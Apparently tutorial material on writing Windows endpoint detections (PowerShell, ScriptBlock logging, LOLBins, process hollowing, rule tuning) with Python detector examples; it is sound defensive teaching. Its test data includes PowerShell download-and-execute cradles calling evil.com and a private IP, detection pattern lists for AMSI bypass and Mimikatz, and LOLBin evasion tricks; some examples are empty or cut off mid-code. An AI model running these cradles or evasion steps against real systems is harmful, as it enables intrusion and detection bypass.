Concept 1 — How EDR Sensors Collect Telemetry

EDR (Endpoint Detection and Response) tools instrument the operating system kernel to capture events that standard log sources miss. Where Windows Security event logs capture authentication and audit events, EDR sensors hook system calls and observe process creation, file writes, registry changes, network connections, and memory operations in real time.

The telemetry hierarchy from richest to sparser:

  • Kernel driver hooks (EDR agent, Sysmon): process injection, memory allocation, driver loads — raw system-call level
  • ETW (Event Tracing for Windows): Microsoft's event instrumentation bus — .NET, PowerShell, WMI, DNS
  • Windows Event Log: authentication, object access, audit events — coarser granularity
  • File-based logs: IIS, application logs — no real-time delivery guarantee

Sysmon sits at the ETW + driver level. Microsoft Defender for Endpoint (MDE) and CrowdStrike operate at the kernel driver level with additional behavioral engine analysis. The richer the telemetry, the more accurate the detection — but also the higher the storage and processing cost.

Data engineering analogy: EDR telemetry is the equivalent of CDC (Change Data Capture) in a data pipeline. Instead of reading daily snapshots, you capture every row-level change in real time. The trade-off is the same: near-real-time fidelity at higher cost vs. batch snapshots at lower cost.

Concept 1 — PowerShell Attack Vectors


PowerShell is the most commonly abused built-in Windows tool for post-exploitation. Attackers use it because it is installed on every Windows machine, has deep access to the .NET framework and Windows API, and can download and execute code in memory without writing files to disk.


Core PowerShell attack patterns:


    

  • Encoded commands: -enc / -EncodedCommand encodes the payload in Base64, hiding it from basic command-line string matching
    • 

  • Download cradles: IEX (New-Object Net.WebClient).DownloadString(URL) — downloads and executes a script entirely in memory
    • 

  • Constrained Language Mode bypass: attackers use -version 2 to downgrade PowerShell to a version that predates many security controls (AMSI, ScriptBlock logging)
    • 

  • AMSI bypass: injecting into the AmsiScanBuffer function to disable Antimalware Scan Interface before running malicious code
    • 

  • Obfuscation: string concatenation ("power" + "shell"), backtick insertion (powershell), character substitution
    • 



Detection strategy: layer multiple indicators — command-line flags (-enc, -nop, -w hidden), parent process anomalies, ScriptBlock logging (Event ID 4104), PowerShell version downgrade.


Example:


import base64
from dataclasses import dataclass
from typing import List

@dataclass
class PowerShellEvent:
    command_line: str
    parent_process: str
    user: str
    ps_version: str = "5.1"
    script_block: str = ""

def decode_b64_command(encoded: str) -> str:
    try:
        decoded = base64.b64decode(encoded).decode("utf-16-le")
        return decoded
    except Exception:
        return "[decode failed]"

def analyze_powershell_event(event: PowerShellEvent) -> List[str]:
    indicators = []
    cmd = event.command_line.lower()

    if "-enc" in cmd or "-encodedcommand" in cmd:
        indicators.append("ENCODED_COMMAND")
        parts = event.command_line.split()
        for i, part in enumerate(parts):
            if part.lower() in ("-enc", "-encodedcommand") and i + 1 < len(parts):
                decoded = decode_b64_command(parts[i + 1])
                indicators.append(f"DECODED: {decoded[:80]}")

    if "-nop" in cmd or "-noprofile" in cmd:
        indicators.append("NO_PROFILE")
    if "-w hidden" in cmd or "-windowstyle hidden" in cmd:
        indicators.append("HIDDEN_WINDOW")
    if "-version 2" in cmd or "-ver 2" in cmd:
        indicators.append("VERSION_DOWNGRADE")
    if "downloadstring" in cmd or "webclient" in cmd or "iex " in cmd:
        indicators.append("DOWNLOAD_CRADLE")
    if event.parent_process.lower() in ("winword.exe", "excel.exe", "outlook.exe", "acrord32.exe"):
        indicators.append(f"SUSPICIOUS_PARENT:{event.parent_process}")

    return indicators

encoded_payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')".encode("utf-16-le")).decode()

event = PowerShellEvent(
    command_line=f"powershell.exe -nop -w hidden -enc {encoded_payload}",
    parent_process="winword.exe",
    user="CORP\\jsmith",
)

indicators = analyze_powershell_event(event)
for ind in indicators:
    print(ind)

Concept 2 — Writing a Production PowerShell Sigma Rule


A production Sigma rule for PowerShell execution is more complex than a tutorial rule because it must balance detection coverage against false positive rate. The rule must be tunable: a base rule catches the broadest set of malicious patterns, with an explicit allowlist for known-legitimate processes that match.


Production Sigma rule structure for PowerShell detection:


    

  • Detection logic: use OR conditions within a selection block (pipe-separated lists)
    • 

  • Allowlist (filter): use a filter block with condition: selection and not filter
    • 

  • Multiple selections: selection_encoded + selection_parent + selection_downgrade combined with 1 of selection_*
    • 



The condition 1 of selection_* fires if any selection block matches, which implements OR logic across blocks without a deeply nested condition string.


Example:

Concept 3 — ScriptBlock Logging and Event 4104


Windows Event ID 4104 is generated by the PowerShell ScriptBlock logging feature, which records the full content of every PowerShell script block as it executes — even after obfuscation is decoded, because the logging happens after the PowerShell engine deobfuscates the payload.


Event 4104 requires Group Policy configuration: Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging. Once enabled, the full script content is visible even if the command-line used -enc encoding.


Detecting on ScriptBlock content catches techniques that evade command-line analysis:


    

  • Obfuscated Invoke-Expression calls that expand at runtime
    • 

  • Multi-stage loaders that appear benign on the command line but contain malicious content in the script block
    • 

  • AMSI bypass code that uses string concatenation to hide function names
    • 



Detection strategy: write two rules — one for command-line indicators (Event ID 1 via Sysmon) and one for ScriptBlock content (Event ID 4104). Together they cover the full attack surface.


Example:


from dataclasses import dataclass
from typing import List
import re

@dataclass
class ScriptBlockEvent:
    event_id: int  # 4104
    script_block_id: str
    script_block_text: str
    path: str
    hostname: str
    user: str

SCRIPTBLOCK_MALICIOUS_PATTERNS = [
    (r"AmsiScanBuffer",           "AMSI_BYPASS"),
    (r"VirtualAlloc",             "SHELLCODE_ALLOC"),
    (r"GetProcAddress",           "API_RESOLVE"),
    (r"Invoke-Mimikatz",          "MIMIKATZ_INVOCATION"),
    (r"sekurlsa::",               "MIMIKATZ_MODULE"),
    (r"\$env:APPDATA.*\.exe",     "APPDATA_EXEC"),
    (r"New-Object.*WebClient",    "WEBCLIENT"),
    (r"IEX\s*\(",                 "INVOKE_EXPRESSION"),
    (r"\[Convert\]::FromBase64",  "BASE64_DECODE"),
    (r"Net\.Sockets\.TcpClient",  "RAW_SOCKET"),
]

def analyze_scriptblock(event: ScriptBlockEvent) -> List[dict]:
    findings = []
    for pattern, indicator in SCRIPTBLOCK_MALICIOUS_PATTERNS:
        matches = re.findall(pattern, event.script_block_text, re.IGNORECASE)
        if matches:
            findings.append({
                "indicator": indicator,
                "pattern": pattern,
                "match_count": len(matches),
            })
    return findings

sample_script = """
$encoded = [Convert]::FromBase64String('aQBlAHgA')
$text = [Text.Encoding]::Unicode.GetString($encoded)
IEX ($text)
$wc = New-Object Net.WebClient
$payload = $wc.DownloadString('http://192.168.1.100/stage2.ps1')
IEX $payload
"""

event = ScriptBlockEvent(
    event_id=4104,
    script_block_id="a1b2c3d4",
    script_block_text=sample_script,
    path="",
    hostname="ws-042",
    user="CORP\\jsmith",
)

findings = analyze_scriptblock(event)
for f in findings:
    print(f"{f['indicator']}: {f['match_count']} match(es)")

Concept 1 — Living Off the Land Binaries


LOLBins (Living Off the Land Binaries) are legitimate Windows executables that attackers abuse to execute malicious code, bypass application allowlisting, and blend into normal system activity. They are powerful for attackers because they are signed by Microsoft, present on every Windows installation, and commonly excluded from security tooling.

Detection approach: for each LOLBin, identify the argument patterns that indicate abuse rather than legitimate use. A certutil.exe -decode or certutil.exe -urlcache -f http:// is nearly always malicious.


Example:


from dataclasses import dataclass
from typing import List, Optional

@dataclass
class LOLBinRule:
    binary_name: str
    technique_id: str
    malicious_args: List[str]
    legitimate_args: List[str]
    description: str

    def matches(self, command_line: str) -> Optional[str]:
        cmd = command_line.lower()
        if not self.binary_name.lower() in cmd:
            return None
        for malicious in self.malicious_args:
            if malicious.lower() in cmd:
                return f"{self.binary_name}: {malicious}"
        return None

LOLBIN_RULES = [
    LOLBinRule(
        "certutil.exe", "T1105",
        malicious_args=["-urlcache", "-decode", "-encodehex", "http://", "https://"],
        legitimate_args=["-viewstore", "-store", "-addstore"],
        description="CertUtil download or encoding abuse",
    ),
    LOLBinRule(
        "mshta.exe", "T1218.005",
        malicious_args=["http://", "https://", "javascript:", "vbscript:"],
        legitimate_args=[],
        description="MSHTA remote script execution",
    ),
    LOLBinRule(
        "regsvr32.exe", "T1218.010",
        malicious_args=["/s /n /u /i:http", "/i:http", "scrobj.dll"],
        legitimate_args=[],
        description="Squiblydoo COM scriptlet bypass",
    ),
]

test_commands = [

Concept 2 — Writing a LOLBin Sigma Rule


LOLBin Sigma rules use the endswith modifier on the Image field to match the binary, then contains on CommandLine to match the malicious argument pattern. The main tuning challenge is false positives: certutil.exe is used by legitimate software update tools; rundll32.exe is called thousands of times a day on a Windows machine.


Key tuning techniques for LOLBin rules:


    

  • Allowlist by parent process: SCCM and Intune both call msiexec.exe legitimately
    • 

  • Require multiple indicators: certutil.exe downloading from a non-corporate URL is more reliable than any certutil execution
    • 

  • Use the CommandLine context: certutil.exe -viewstore MY is always benign; the download path is the indicator
    • 

  • Combine with asset tier: disable high-noise rules on developer workstations, keep them enabled on servers
    •

Concept 3 — LOLBin Detection Gaps and Evasion


Understanding LOLBin detection gaps helps you build more robust rules and recognize when you need multiple complementary detections.


Common LOLBin detection evasion techniques:


    

  • Copy to new path: copy certutil.exe to C:\Users\user\AppData\Local\Temp\svchost.exe — the rule matching Image|endswith: '\certutil.exe' misses it
    • 

  • Environment variable expansion: %COMSPEC% instead of cmd.exe, %SystemRoot%\System32\certutil.exe as a path
    • 

  • Argument abbreviation: /u instead of /urlcache, -d instead of -decode (certutil supports abbreviations)
    • 

  • Process renaming: copying a LOLBin to a new name bypasses binary-name rules
    • 



Counter-strategy layering:


    

  1. Hash-based detection: Sysmon Event 1 captures Hashes — alert on the certutil binary hash regardless of filename
    2. 

  2. Parent-child relationships: unusual parent processes spawning known-path LOLBins
    3. 

  3. File system artifacts: certutil download creates a cache entry in %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\
    4. 

  4. Network correlation: combine process creation alert with a subsequent outbound connection alert from the same host within 60 seconds
    5.

Concept 1 — Process Hollowing Mechanics


Process hollowing (T1055.012) is a process injection technique where an attacker creates a legitimate process in a suspended state, unmaps its memory contents, writes malicious code into the empty process address space, and resumes execution. From the process list, the running process appears legitimate (e.g., svchost.exe) but executes the attacker's code.


The four-step attack sequence:


    

  1. CreateProcess with CREATE_SUSPENDED flag — process created but not running
    2. 

  2. NtUnmapViewOfSection — original code section unmapped from memory
    3. 

  3. WriteProcessMemory — malicious payload written into the now-empty address space
    4. 

  4. SetThreadContext + ResumeThread — entry point redirected to malicious code; process resumed
    5. 



Detection indicators:


    

  • Sysmon Event ID 25 (ProcessTampering) — specifically designed for this, fires when a running process's image does not match the file on disk
    • 

  • Sysmon Event ID 8 (CreateRemoteThread) — alternative injection method that sometimes accompanies hollowing
    • 

  • Image mismatch: process claims to be svchost.exe but its file hash does not match the known-good svchost hash
    • 

  • Unusual parent: svchost.exe spawned by cmd.exe instead of services.exe
    • 



Data engineering analogy: process hollowing is equivalent to a schema swap attack — the table name (process name) remains unchanged, but the schema definition (code) has been silently replaced with malicious content.


Example:


from dataclasses import dataclass
from typing import List, Optional

KNOWN_GOOD_PARENT_MAP = {
    "svchost.exe":      ["services.exe", "svchost.exe"],
    "lsass.exe":        ["wininit.exe"],
    "spoolsv.exe":      ["services.exe"],
    "csrss.exe":        ["smss.exe"],
    "winlogon.exe":     ["smss.exe"],
    "explorer.exe":     ["userinit.exe", "winlogon.exe"],
}

SENSITIVE_PROCESSES = {"svchost.exe", "lsass.exe", "csrss.exe", "winlogon.exe", "spoolsv.exe"}

@dataclass
class ProcessTamperingEvent:
    event_id: int  # 25 = Sysmon ProcessTampering
    image_path: str
    process_name: str
    pid: int
    parent_name: str
    image_on_disk_hash: str
    running_image_hash: str  # captured from memory

    def hollowing_indicators(self) -> List[str]:
        indicators = []

        if self.event_id == 25:
            indicators.append("SYSMON_PROCESS_TAMPERING_EVENT25")

        if self.image_on_disk_hash != self.running_image_hash:
            indicators.append(f"IMAGE_HASH_MISMATCH: disk={self.image_on_disk_hash[:8]}... mem={self.running_image_hash[:8]}...")

        expected_parents = KNOWN_GOOD_PARENT_MAP.get(self.process_name.lower())
        if expected_parents and self.parent_name.lower() not in [p.lower() for p in expected_parents]:
            indicators.append(f"UNEXPECTED_PARENT: {self.parent_name} → {self.process_name}")

        if self.process_name.lower() in SENSITIVE_PROCESSES and self.event_id == 25:
            indicators.append("HIGH_VALUE_PROCESS_TAMPERED")

        return indicators

Concept 2 — Process Relationship Trees


Process hollowing is easier to detect when you analyze process relationships as a tree rather than individual events. Legitimate Windows processes follow strict parent-child relationships. Deviations from expected parent-child pairs are high-fidelity indicators.


Common suspicious parent-child deviations:


    

  • winword.exe → powershell.exe (document executing shell)
    • 

  • explorer.exe → regsvr32.exe (user-triggered LOLBin)
    • 

  • svchost.exe → cmd.exe (service spawning interactive shell)
    • 

  • lsass.exe → cmd.exe (credential process spawning shell — likely injection)
    • 



Building a process tree from events allows you to trace the chain from the original process to the final malicious child, which is critical for incident response scope assessment.


Example:


from dataclasses import dataclass
from typing import List, Optional, Dict

@dataclass
class ProcessNode:
    pid: int
    ppid: int
    image_name: str
    command_line: str
    children: List["ProcessNode"] = None

    def __post_init__(self):
        if self.children is None:
            self.children = []

def build_process_tree(events: List[dict]) -> Dict[int, ProcessNode]:
    nodes: Dict[int, ProcessNode] = {}
    for ev in events:
        node = ProcessNode(
            pid=ev["pid"],
            ppid=ev["ppid"],
            image_name=ev["image"],
            command_line=ev["cmdline"],
        )
        nodes[node.pid] = node

    for node in nodes.values():
        parent = nodes.get(node.ppid)
        if parent:
            parent.children.append(node)

    return nodes

def find_suspicious_chains(nodes: Dict[int, ProcessNode]) -> List[str]:
    SUSPICIOUS_PAIRS = [
        ("winword.exe", "powershell.exe"),
        ("excel.exe",   "cmd.exe"),
        ("svchost.exe", "cmd.exe"),
        ("lsass.exe",   "cmd.exe"),
        ("svchost.exe", "powershell.exe"),
    ]
    alerts = []
    for node in nodes.values():
        for child in node.children:
            parent_name = node.image_name.lower()
            child_name = child.image_name.lower()
            for sus_parent, sus_child in SUSPICIOUS_PAIRS:
                if parent_name.endswith(sus_parent) and child_name.endswith(sus_child):
                    alerts.append(f"SUSPICIOUS_CHAIN: {node.image_name}[{node.pid}] → {child.image_name}[{child.pid}]")
    return alerts

events = [
    {"pid": 1000, "ppid": 500,  "image": "services.exe",  "cmdline": ""},
    {"pid": 2000, "ppid": 1000, "image": "svchost.exe",   "cmdline": ""},
    {"pid": 3000, "ppid": 2000, "image": "cmd.exe",        "cmdline": "cmd.exe /c whoami"},
    {"pid": 4000, "ppid": 3000, "image": "powershell.exe", "cmdline": "powershell.exe -enc aQBlAHgA"},
]

tree = build_process_tree(events)
alerts = find_suspicious_chains(tree)
for alert in alerts:
    print(alert)

Concept 1 — False Positive Triage Workflow


A production detection rule that fires 200 times per day, most of which are false positives, needs tuning before analysts trust it. Systematic false positive triage follows a documented process rather than ad hoc filter additions that accumulate over time without review.


False positive triage workflow:


    

  1. Collect a sample: gather 50–100 false positive events for the rule over one week
    2. 

  2. Cluster by attribute: group by parent process, user, hostname, command-line pattern
    3. 

  3. Identify the distinguishing attribute: what is consistently different in FPs vs. TPs?
    4. 

  4. Write a targeted filter: filter on the specific attribute, not a broad exclusion
    5. 

  5. Validate the filter: apply it to the sample, confirm it removes FPs without removing TPs
    6. 

  6. Document the filter rationale: record what process/tool causes this FP and why
    7. 



The anti-pattern: adding filter: User: SYSTEM to remove noise — this also removes real attacks running as SYSTEM, which are high-severity.


Example:


from dataclasses import dataclass
from typing import List
from collections import Counter

@dataclass
class AlertSample:
    alert_id: str
    rule_id: str
    image: str
    parent_image: str
    command_line: str
    user: str
    hostname: str
    verdict: str  # "TP" | "FP" | "UNKNOWN"

def analyze_false_positive_cluster(samples: List[AlertSample]) -> dict:
    fps = [s for s in samples if s.verdict == "FP"]
    tps = [s for s in samples if s.verdict == "TP"]

    if not fps:
        return {"message": "No false positives in sample"}

    fp_parents = Counter(s.parent_image.lower() for s in fps)
    fp_users   = Counter(s.user.lower() for s in fps)
    tp_parents = Counter(s.parent_image.lower() for s in tps)

    parent_only_in_fps = {p for p in fp_parents if p not in tp_parents}

    return {
        "total_fps": len(fps),
        "total_tps": len(tps),
        "fp_parent_distribution": dict(fp_parents.most_common(5)),
        "safe_to_filter_parents": sorted(parent_only_in_fps),
    }

Concept 2 — Rule Lifecycle Management


A detection rule has a lifecycle: draft → experimental → production → deprecated. Managing this lifecycle prevents rules from staying in "experimental" indefinitely, accumulates tuning history, and ensures deprecated rules do not silently stop firing.


Rule lifecycle stages:


    

  • Draft: written, not yet deployed — no alerts generated
    • 

  • Experimental: deployed to a non-alerting "observation mode" — events logged but not paged
    • 

  • Production: deployed and alerting — SNR ≥ 0.80, reviewed by analyst
    • 

  • Tuning: back in experimental after SNR drops below threshold — tuning in progress
    • 

  • Deprecated: disabled with documentation of why (replaced by a better rule, log source retired, technique no longer relevant)
    • 



Lifecycle transitions must be logged: when, by whom, and why. This creates an audit trail for compliance and a knowledge base for future rule authors.


Example:


from dataclasses import dataclass, field
from typing import List, Optional
from enum import Enum
from datetime import date

class RuleStatus(str, Enum):
    DRAFT       = "draft"
    EXPERIMENTAL = "experimental"
    PRODUCTION  = "production"
    TUNING      = "tuning"
    DEPRECATED  = "deprecated"

@dataclass
class StatusTransition:
    from_status: RuleStatus
    to_status: RuleStatus
    date: date
    author: str
    reason: str

@dataclass
class ManagedRule:
    rule_id: str
    title: str
    status: RuleStatus = RuleStatus.DRAFT
    history: List[StatusTransition] = field(default_factory=list)
    current_snr: Optional[float] = None

    def transition(self, new_status: RuleStatus, author: str, reason: str):
        self.history.append(StatusTransition(
            from_status=self.status,
            to_status=new_status,
            date=date.today(),
            author=author,
            reason=reason,
        ))
        self.status = new_status

    def lifecycle_summary(self) -> str:
        lines = [f"Rule {self.rule_id}: {self.title} [{self.status.value}]"]
        for t in self.history:
            lines.append(f"  {t.date} | {t.from_status.value} → {t.to_status.value} | {t.author}: {t.reason}")
        return "\n".join(lines)

rule = ManagedRule("SIG-001", "PowerShell Encoded Command")
rule.transition(RuleStatus.EXPERIMENTAL, "alice", "Initial deployment for observation — 30-day FP baseline collection")
rule.transition(RuleStatus.PRODUCTION,   "alice", "SNR=0.92 after filtering sccm.exe parent; promoted")
rule.current_snr = 0.92
rule.transition(RuleStatus.TUNING,       "bob",   "SNR dropped to 0.61 after new SCCM version release; re-tuning filter")

print(rule.lifecycle_summary())

        seen_ids.add(entry["id"])
        if entry["status"] not in ("production", "experimental", "draft", "deprecated"):
            errors.append(f"Invalid status for {entry['id']}: {entry['status']}")
